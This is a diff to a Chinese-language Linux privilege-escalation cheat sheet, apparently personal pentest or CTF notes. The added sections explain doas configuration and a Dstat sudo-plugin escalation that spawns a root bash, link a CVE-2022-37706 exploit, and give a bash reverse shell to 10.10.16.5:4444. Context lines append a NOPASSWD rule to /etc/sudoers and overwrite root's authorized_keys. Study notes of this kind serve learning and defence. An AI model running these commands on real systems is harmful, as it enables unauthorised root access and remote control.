@@ -2,7 +2,7 @@
 title: linux提权
 date: 2025-03-19 14:50:13	
 tags: linux提权
-categories: linux
+categories: Linux
 ---
 
 
@@ -141,6 +141,26 @@ sudo -l查看当前用户可以使用的命令
 
 https://gtfobins.github.io/ 
 
+## doas
+
+doas是sudo的替代品
+
+默认情况安装到`/usr/local/bin`，其配置文件在`/usr/local/etc/doas.conf`
+
+doas.conf的语法
+
+```
+permit|deny [options] identity [as target] [cmd command [args ...]]
+```
+
+options包括
+
+> 1. nopass，执行命令时不需要输入密码
+> 2. nolog，命令执行成功时不会记录
+> 3. persist，授权后，一段时间内不会要求再次输入密码
+> 4. keepenv，如果没有其他说明，保持环境变量不变
+> 5. setenv，设置临时的环境变量，具体方法为 `setenv { -ENV PS1=$DOAS_PS1 SSH_AUTH_SOCK }`
+
 ## nmap
 
 ### Nmap Interactive Mode Nmap 交互模式
@@ -216,7 +236,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 典型的使用SUID的命令
 
-![rSRTn5v](./Linux%20Privilege/rSRTn5v.png)
+![rSRTn5v](Linux%20Privilege/rSRTn5v.png)
 
 https://gtfobins.github.io/ 
 
@@ -579,7 +599,33 @@ curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'id_rsa.pub'
 ssh -i ~/.ssh/id_rsa root@10.10.11.243
 ```
 
+## Dstat提权
 
+Dstat有个功能就是提供了用户自定义插件（python脚本）的功能
+
+插件位置
+
+```
+/usr/share/dstat/
+/usr/local/share/dstat/
+```
+
+可以在插件位置写入插件（提权脚本），使用sudo命令运行dstat插件
+
+```python
+import os
+os.system("/bin/bash")
+```
+
+<font color=red>脚本的命名格式`dstat_xxx.py`</font>
+
+使用sudo来调用这个插件，即可得到root权限
+
+
+
+## SUID-enlightenment_sys
+
+[CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
 
 # 脏牛提权
 
@@ -642,5 +688,10 @@ return 0;
 ```
 将用户权限写进/etc/sudoers
 echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL >>/etc/sudoers' " >update
+```
+
+```
+#! /bin/bash
+bash -i &> /dev/tcp/10.10.16.5/4444 0>&1
 ```
 
